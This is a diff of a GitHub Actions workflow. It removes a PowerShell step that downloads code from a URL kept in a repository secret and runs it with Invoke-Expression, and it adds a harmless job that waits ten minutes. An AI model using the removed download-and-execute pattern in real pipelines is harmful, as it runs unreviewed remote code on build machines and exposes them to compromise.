@@ -1,15 +1,27 @@
-name: CM Virtual
+name: Test 10 Minutes
 
 on:
   workflow_dispatch:
 
 jobs:
-  deploy:
+  test:
     runs-on: windows-2022
 
     steps:
-      - name: Run Script
+      - name: Start
         shell: pwsh
         run: |
-          $key = "${{ secrets.CHARMWAVE_KEY }}"
-          Invoke-Expression (Invoke-WebRequest -Uri $key -UseBasicParsing).Content
+          Write-Host "Runner started"
+
+      - name: Wait 10 Minutes
+        shell: pwsh
+        run: |
+          for ($i = 1; $i -le 10; $i++) {
+            Write-Host "Minute $i of 10"
+            Start-Sleep -Seconds 60
+          }
+
+      - name: Finish
+        shell: pwsh
+        run: |
+          Write-Host "Runner finished"
